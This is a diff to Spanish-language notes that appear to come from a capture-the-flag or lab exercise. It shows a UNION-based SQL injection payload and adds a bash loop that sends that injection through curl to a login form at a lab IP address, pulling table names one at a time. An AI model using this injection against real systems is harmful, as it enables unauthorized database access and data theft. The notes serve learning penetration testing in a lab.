@@ -66,6 +66,10 @@ Enumerar tablas existentes
 `' union select 1,2,3,table_name from information_schema.tables-- -`
 
 Al enumerarlas así se nos muestran todas juntas así que vamos a hacer que se nos enumeren de una forma en las que sean legibles
+```bash
+for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,table_name from information_schema.tables limit $i,1-- -&password=test" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done
+```
+
 
 
 
